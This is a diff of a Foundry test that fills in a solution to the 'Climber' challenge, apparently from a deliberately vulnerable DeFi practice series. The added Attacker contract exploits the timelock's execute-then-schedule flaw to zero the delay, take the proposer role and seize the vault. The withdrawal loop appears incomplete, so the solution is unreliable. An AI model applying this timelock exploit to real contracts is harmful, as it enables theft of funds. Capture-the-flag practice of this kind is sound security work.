@@ -40,12 +40,12 @@ contract ClimberChallenge is Test {
         // Deploy the vault behind a proxy,
         // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
         vault = ClimberVault(
-            address(
-                new ERC1967Proxy(
-                    address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
-                )
-            )
+                             address(
+                                     new ERC1967Proxy(
+                                                      address(new ClimberVault()), // implementation
+                                                      abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
+                                     )
+                             )
         );
 
         // Get a reference to the timelock deployed during creation of the vault
@@ -85,7 +85,51 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker();
+        address[] memory targets = new address[](4);
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = address(vault);
+        targets[3] = address(attacker);
+
+        uint256[] memory values = new uint256[](4); // init to zeros by default
+
+        bytes[] memory dataElements = new bytes[](4);
+        bytes memory changeDelayData = abi.encodeWithSelector(timelock.updateDelay.selector, uint256(0));
+        bytes memory addProposerData = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(attacker));
+        bytes memory addOwnerData = abi.encodeWithSelector(vault.transferOwnership.selector, player);
+        // bytes memory withdrawData = abi.encodeWithSelector(vault.withdraw.selector, address(token), recovery, VAULT_TOKEN_BALANCE);
+        bytes memory scheduleData = abi.encodeWithSignature("scheduleWithData()");
+        dataElements[0] = changeDelayData;
+        dataElements[1] = addProposerData;
+        dataElements[2] = addOwnerData;
+        dataElements[3] = scheduleData;
+        bytes32 salt = bytes32(0);
+
+        attacker.setScheduleData( // Need this to add a schedule in ClimberTimelock first
+                                 timelock,
+                                 targets,
+                                 values,
+                                 dataElements,
+                                 salt
+        );
+
+        timelock.execute(targets, values, dataElements, bytes32(0));
+
+        vm.warp(block.timestamp + 15 days + 1); // Todo update the vault contract to override the withdraw timestamp, so we don't have to wait for 15 days?
+
+        while (true){
+            uint256 balance = token.balanceOf(address(vault));
+            if (balance > 1 ether){
+                balance = 1 ether;
+            }
+            if (balance == 0){
+                break;
+            }
+            // vm.warp(block.timestamp + 15 days + 1);
+            vault.withdraw(address(token), recovery, balance);
+        }
+
     }
 
     /**
@@ -95,4 +139,31 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+
+contract Attacker{
+    address[] public targets;
+    uint256[] public values;
+    bytes[] public dataElements;
+    bytes32 public salt;
+    ClimberTimelock public timelock;
+
+    function setScheduleData(
+                             ClimberTimelock _timelock,
+                             address[] memory _targets,
+                             uint256[] memory _values,
+                             bytes[] memory _dataElements,
+                             bytes32 _salt
+    ) public {
+        targets = _targets;
+        values = _values;
+        dataElements = _dataElements;
+        salt = _salt;
+        timelock = _timelock;
+    }
+    function scheduleWithData() public{
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+
 }
